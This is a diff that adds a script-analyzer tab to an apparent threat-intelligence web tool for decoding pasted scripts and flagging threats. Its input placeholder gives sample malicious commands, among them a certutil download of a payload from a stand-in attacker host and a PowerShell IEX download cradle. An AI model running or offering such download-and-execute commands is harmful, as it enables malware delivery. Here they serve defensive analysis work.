@@ -48,6 +48,7 @@
       <div class="tab-bar">
         <button class="tab-btn active" data-tab="single" type="button">🔍 Single IOC</button>
         <button class="tab-btn" data-tab="bulk" type="button">📋 Bulk IOC</button>
+        <button class="tab-btn" data-tab="script" type="button">⚡ Script Analyzer</button>
       </div>
     </div>
 
@@ -444,6 +445,45 @@
       </div>
       <div id="bulk-results" class="bulk-results"></div>
     </div><!-- end tab-bulk -->
+
+    <!-- ===== SCRIPT ANALYZER TAB ===== -->
+    <div id="tab-script" class="tab-panel">
+
+      <!-- Mode selector -->
+      <div class="sa-mode-bar">
+        <button class="sa-mode-btn active" data-mode="powershell" type="button">⚡ PowerShell</button>
+        <button class="sa-mode-btn" data-mode="cmdline" type="button">🖥 Command Line</button>
+        <button class="sa-mode-btn" data-mode="bash" type="button">🐧 Bash / Shell</button>
+        <button class="sa-mode-btn" data-mode="vbs" type="button">📜 VBScript / WSH</button>
+        <button class="sa-mode-btn" data-mode="js" type="button">🌐 JS / JScript</button>
+        <button class="sa-mode-btn" data-mode="auto" type="button">🤖 Auto-Detect</button>
+      </div>
+
+      <div class="input-panel" style="margin-top:12px;">
+        <div class="sa-input-header">
+          <div>
+            <h3 style="margin:0 0 4px;font-size:15px;">⚡ Script / Command Analyzer</h3>
+            <p style="margin:0;font-size:12px;color:var(--muted);">Paste any PowerShell, CMD, Bash, VBScript, or JS snippet — the analyzer will decode, flag threats, map MITRE TTPs, and extract IOCs.</p>
+          </div>
+          <div class="sa-actions">
+            <button id="sa-analyze-btn" type="button">🔍 Analyze</button>
+            <button id="sa-clear-btn" type="button">🗑 Clear</button>
+            <button id="sa-copy-btn" type="button">📋 Copy Report</button>
+            <button id="sa-decode-btn" type="button" title="Attempt to decode all Base64 layers">🔓 Deep Decode</button>
+          </div>
+        </div>
+        <textarea id="sa-input" spellcheck="false" autocomplete="off"
+          placeholder="Paste PowerShell, CMD, Bash, VBScript, JScript or any command-line snippet here...&#10;&#10;Examples:&#10;  powershell -enc JABjACAAPQAgACcA...&#10;  cmd /c certutil -urlcache -f http://evil.com/pay.exe&#10;  IEX (New-Object Net.WebClient).DownloadString('http://...')"></textarea>
+        <div id="sa-status" class="status" style="margin-top:10px;">
+          <span>Paste a script above and click Analyze</span>
+          <span class="badge" id="sa-mode-badge">POWERSHELL</span>
+        </div>
+      </div>
+
+      <!-- Results area -->
+      <div id="sa-results" class="sa-results"></div>
+
+    </div><!-- end tab-script -->
 
   </div><!-- end main -->
 
